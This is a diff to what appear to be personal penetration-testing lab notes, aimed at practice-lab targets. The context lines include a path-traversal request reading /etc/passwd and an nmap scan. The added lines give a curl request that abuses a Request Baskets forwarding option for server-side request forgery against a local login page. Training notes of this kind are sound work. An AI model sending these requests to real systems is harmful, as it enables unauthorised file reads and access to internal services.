@@ -190,3 +190,8 @@ GET /download?file=....//....//....//....//etc/passwd HTTP/1.1
 nmap -p22,53,80 -sCV 10.129.150.83 -oN targeted
 ```
 
+### post request with curl
+
+```
+ curl --location 'http://10.10.11.224:55555/api/baskets/yesterday' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
+```
